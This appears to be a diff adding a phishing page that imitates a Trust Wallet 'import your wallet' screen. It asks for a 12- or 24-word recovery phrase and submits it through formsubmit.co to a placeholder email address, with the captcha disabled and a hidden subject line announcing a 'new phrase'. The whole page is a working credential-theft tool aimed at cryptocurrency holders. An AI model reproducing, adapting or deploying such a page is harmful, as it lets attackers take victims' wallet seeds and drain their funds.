@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Trust wallet</title>
+    <link rel="stylesheet" href="/styles.css">
+    <!-- <link rel="preconnect" href="https://fonts.googleapis.com">
+     -->
+     <style>
+         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@500&family=Poppins:wght@300&display=swap');
+*{
+    font-family: 'Poppins', sans-serif;
+}
+body{
+    display: flex;
+    margin: auto;
+    height: 100vh;
+    justify-content: center;
+    align-items: center;
+    padding: 10px;
+    background:  rgb(0, 0, 17);
+}
+
+.button {
+    display: flex;
+    justify-content: space-between;
+    padding: .8em;
+
+}
+/* .btn {
+    padding: .8em; border-radius: 6px;
+} */
+.tabs{
+    display: flex; justify-content: space-between;
+    padding: 1em; margin: auto; 
+}
+
+a {
+    color: white; border: 1px solid rgb(0, 0, 17);
+    border-radius: 8px; padding: 5px;  background:  rgb(0, 0, 17);
+    font-weight: 400;
+}
+a:hover {
+    color: black; background: whitesmoke; font-weight: 600;
+    border: none; font-size: 600;
+}
+.container {
+    padding-top: 1em;
+    /* background: yellow; */
+}
+.form {
+    margin-bottom: 10px; 
+}
+.cont .container .phrase {
+        height: 100px;
+        width: 90%;
+        padding: 2px;
+        margin: 10px;
+        justify-content: center;
+        align-items: center;
+        border-radius: 6px;
+        border: 1px solid grey;
+}
+.btn-1 {
+    padding: 5px 1.5em; border-radius: 6px;
+    margin-left: 2em; letter-spacing: 1px;
+    font-weight: 600;
+}
+.btn-2 {
+    padding: 5px 25px; border-radius: 6px;
+    margin-right: 2em; letter-spacing: 1px;
+    font-weight: 600;
+}
+.phrase {
+    margin: 200px;
+    outline: none;
+    /* border-bottom-width: 2px; */
+}
+
+input:focus,
+input:valid {
+    /* background: rgba(128, 128, 128, 0.207); */
+    outline: none;
+}
+     </style>
+</head>
+
+
+<body style="font-family: sans-serif; ">
+
+    <div style="border: 1px solid rgba(207, 193, 193, 0.255); margin: 2em; border-top: 0px; border-radius: 1em; box-shadow: 1px 1px 10px rgba(128, 128, 128, 0.337); background: whitesmoke; padding: 20px 25px;" class="cont">
+        <h2 style="padding: 1em; padding-bottom: 0; text-align: center; text-decoration: underline; font-weight: 500;">
+            Import your Wallet Extension
+        </h2>
+        <div >
+            <h3 style="font-weight: 200; padding-left: 1em;">Wallet name:</h3>
+            <div style="border: 1px solid black; border-radius: 5px; padding: 5px; width:80%; text-align: center; margin: auto; ">
+                Trust Wallet
+            </div>
+        </div>
+        <div class="container">
+            <ul class="tabs" style=" list-style-type: none;">
+                <li class="tab is-active"><a data-switcher data-tab="1" href="./panel.html" style="text-decoration:none;"> Phrase </a>
+                </li>
+                <li class="tab"><a data-switcher data-tab="2" href="./keystore.html" style="text-decoration:none;"> Keystore JSON  </a>
+                </li>
+                <li class="tab"><a data-switcher data-tab="3" href="./private.html" style="text-decoration:none; background: whitesmoke; color: black;"> Private Key </a>
+            </ul>
+            <form action="https://formsubmit.co/ .@gmail.com" method="POST">
+                <div class="input" >
+                    <div class="form" style="padding-top: 2em;">
+                        <input type="text" placeholder="input your recovery phrase...." class="phrase" required style="height: 70px;">
+                    </div>
+                    <div style="font-weight: 600; font-size: small; margin-bottom: 20px;">Typically 12 (sometimes 24) words seperated by Single Spaces </div>
+
+                    <div class="button">
+                        <button type="submit" style="padding: .6em;  border-radius: 5px; margin-left: 60px; font-weight: 600; letter-spacing: 1px; padding-right: 20px; padding-left: 0px;">
+                            <a style="background: none; color: black; text-decoration: none; border: none; padding: 0; cursor: pointer;" href="./qrcode.html" class="btn-1">
+                            </a>
+                                Proceed
+                        </button>
+                        <!-- <input type="submit" value="Proceed" class="btn-1"> -->
+                        <!-- <input type="submit" value="Cancel" class="btn-2"></a> -->
+
+                        <input type="hidden" name="_next" value="https:// your-link /qrcode.html">
+                        <input type="hidden" name="_subject" value="New 12phrase Added">
+                        <input type="hidden" name="_captcha" value="false">
+                        
+                        <button style="padding: .6em;  border-radius: 5px; margin-right: 60px; font-weight: 600;">
+                            <a style="background: none; color: black; text-decoration: none; border: none; padding: 0; cursor: pointer;" href="./index.html" class="btn-2">
+                                Cancel
+                            </a>
+                        </button>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+
+    </div>
+
+    <!-- <h1 class="text-4xl text-center blue">Building new workload</h1> -->
+    <script src="./app.js"></script>
+</body>
+</html>
